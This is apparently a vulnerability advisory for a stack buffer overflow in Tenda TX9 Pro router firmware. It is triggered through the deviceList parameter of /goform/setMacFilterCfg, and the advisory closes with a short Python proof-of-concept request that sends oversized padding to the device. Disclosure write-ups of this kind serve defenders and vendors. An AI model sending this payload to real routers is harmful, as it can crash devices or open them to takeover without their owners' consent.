# Tenda TX9 Pro setMacFilterCfg
### Overview
vendor: Tenda

product: TX9 Pro

version: V22.03.02.10_multi

type: Buffer Overflow

### Vulnerability Description
A vulnerability has been found in Tenda TX9 Pro V22.03.02.10_multi. This vulnerability can be triggered through the route /goform/setMacFilterCfg. The manipulation of the argument deviceList leads to buffer overflow. The attack is possible to be carried out remotely. The exploit has been disclosed to the public and may be used.

### Vulnerability Details
In function sub_42359C line 25, it reads in a user-provided parameter `deviceList`. The variable `v3` is passed as a parameter to the function sub_4223E0 and ultimately to the `strcpy` function without any length check, which may overflow the stack-based buffer `v15`. As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution.

![](./images/2.png)

![](./images/3.png)

![](./images/4.png)

### POC
```python
import requests
url = 'http://192.168.0.1/goform/setMacFilterCfg'
headers = {
    'Host': '192.168.0.1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
}
data = {
    'macFilterType': 'black',
    'deviceList': 'a' * 1000 + '\n\r' + 'b' * 1000
}
response = requests.post(url, headers=headers, data=data)
```